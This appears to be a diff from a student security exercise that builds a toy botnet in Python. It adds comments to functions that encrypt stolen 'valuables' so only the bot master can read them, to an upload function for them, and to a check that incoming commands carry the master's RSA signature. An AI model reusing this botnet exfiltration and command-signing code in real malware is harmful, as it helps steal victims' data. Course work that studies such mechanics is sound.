@@ -18,9 +18,11 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-     key = RSA.importKey(open('public.pem').read())
-     eyp = key.encrypt(data, 32)[0]
-     return eyp
+    # Load the public RSA key
+    key = RSA.importKey(open('public.pem').read())
+    # Encrypt the file using the public key
+    eyp = key.encrypt(data, 32)[0]
+    return eyp
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -41,16 +43,23 @@ def verify_file(f):
     # Verify the file was sent by the bot master
     # TODO: For Part 2, you'll use public key crypto here
     # Naive verification by ensuring the first line has the "passkey"
-    
+
+    # Exstract the length of the signature
     length = struct.unpack('H', f[:2])[0]
+    # Use the lenth to Exstract the signature
     signature = f[2:length + 2]
-    
+
+    # Set the scope of the file to the actural data of the file
     f = f[length + 2:]
-    
+
+    # Generate a hash of the file data
     hashfile = SHA256.new(f)
+    # Load the public key
     key = RSA.importKey(open('public.pem').read())
+    # Create a verifier
     verifier = PKCS1_v1_5.new(key)
     
+    #Return the result of the verifcation of the signature
     return verifier.verify(hashfile, signature)
     
     
